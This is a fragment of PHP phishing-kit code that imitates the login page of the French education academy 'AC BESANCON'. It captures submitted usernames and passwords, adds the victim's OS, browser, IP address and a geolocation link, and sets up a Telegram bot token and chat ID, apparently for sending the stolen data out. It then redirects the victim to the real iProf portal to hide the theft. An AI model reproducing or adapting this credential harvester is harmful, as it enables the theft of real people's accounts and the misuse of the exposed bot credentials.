...
function get_user_countrycode() {
    ...
    return $countrycode;
        ...
        if(isset($_POST['username'])){
            ...
            $Results = '    ✔️ AC BESANCON' . $_SERVER[''] . "\r\n";
            $Results .= '' . $_POST[''] . "\r\n";
           
            $Results .= ' ✔️ User : ' . $_POST['username'] . "\r\n";
            $Results .= ' ✔️ Pass : ' . $_POST['password'] . "\r\n";

            $Results .= '' . $_POST[''] . "\r\n";
            $Results .= '' . $_POST[''] . "\r\n";
            $Results .= 'OS : ' . get_user_os() . "\r\n";
            $Results .= 'Browser : ' . get_user_browser() . "\r\n";
	    $Results .= '' . $_POST[''] . "\r\n";
	    $Results .= 'IP address : ' . get_user_ip() . "\r\n";
            $Results .= 'Localisation :  http://www.geoiptool.com/?IP='.$_SERVER['REMOTE_ADDR'];



            $apiToken = "6913713369:AAHVgq4Vcnx9jFyA6mvV_L5zJ6Zh5XZ2orA";
            $data = [
                'chat_id' => '-4073240520', 
            ...
            header("Location: https://iprof.adc.education.fr/iprof/ServletIprof");
        }
